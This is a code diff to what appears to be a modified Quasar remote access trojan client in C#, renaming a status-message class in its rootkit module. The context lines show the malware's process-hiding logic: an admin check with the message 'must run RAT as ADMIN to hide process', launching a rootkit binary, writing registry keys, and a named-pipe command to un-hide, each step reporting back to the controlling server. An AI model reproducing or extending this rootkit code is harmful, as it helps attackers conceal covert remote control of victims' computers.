@@ -39,7 +39,7 @@ namespace Quasar.Client.Messages
                 UserAccount acnt = new UserAccount();
                 if (acnt.Type != AccountType.Admin)
                 {
-                    client.Send(new SetStatus { Message = "RK: Error: must run RAT as ADMIN to hide process" });
+                    client.Send(new NotifyMessageToServer { Message = "RK: Error: must run RAT as ADMIN to hide process" });
                     return;
                 }
                 if (a2 == "install")
@@ -59,16 +59,16 @@ namespace Quasar.Client.Messages
                         Process.Start(text11);
                         if (friendlyName.StartsWith("AGG"))
                         {
-                            client.Send(new SetStatus { Message = "RK: Info: process is now hidden (method 1)" });
+                            client.Send(new NotifyMessageToServer { Message = "RK: Info: process is now hidden (method 1)" });
                         }
                         else
                         {
-                            client.Send(new SetStatus { Message = "RK: Info: process is now hidden (method 2)" });
+                            client.Send(new NotifyMessageToServer    { Message = "RK: Info: process is now hidden (method 2)" });
                         }
                     }
                     catch (Exception ex17)
                     {
-                        client.Send(new SetStatus { Message = string.Format("RK: Error: an error occurred with rk binary: {0}", ex17.Message) });
+                        client.Send(new NotifyMessageToServer { Message = string.Format("RK: Error: an error occurred with rk binary: {0}", ex17.Message) });
                     }
                     Thread.Sleep(15000);
                     int id = Process.GetCurrentProcess().Id;
@@ -88,12 +88,12 @@ namespace Quasar.Client.Messages
                     }
                     catch (UnauthorizedAccessException)
                     {
-                        client.Send(new SetStatus { Message = "RK: Error: do not have permission to write to this registry key." });
+                        client.Send(new NotifyMessageToServer { Message = "RK: Error: do not have permission to write to this registry key." });
                         return;
                     }
                     catch (Exception ex18)
                     {
-                        client.Send(new SetStatus { Message = string.Format("RK: Error: an error occurred: {0}", ex18.Message) });
+                        client.Send(new NotifyMessageToServer { Message = string.Format("RK: Error: an error occurred: {0}", ex18.Message) });
                         return;
                     }
                 }
@@ -108,17 +108,17 @@ namespace Quasar.Client.Messages
                         namedPipeClientStream.Connect(1000);
                         byte[] bytes = BitConverter.GetBytes(4098);
                         namedPipeClientStream.Write(bytes, 0, bytes.Length);
-                        client.Send(new SetStatus { Message = "RK: Info: un-hide successfully" });
+                        client.Send(new NotifyMessageToServer { Message = "RK: Info: un-hide successfully" });
                         return;
                     }
                     catch (TimeoutException)
                     {
-                        client.Send(new SetStatus { Message = "RK: Warning: already un-hidden" });
+                        client.Send(new NotifyMessageToServer { Message = "RK: Warning: already un-hidden" });
                         return;
                     }
                     catch (Exception ex19)
                     {
-                        client.Send(new SetStatus { Message = string.Format("RK: Error: {0}", ex19.Message) });
+                        client.Send(new NotifyMessageToServer { Message = string.Format("RK: Error: {0}", ex19.Message) });
                         return;
                     }
                 }
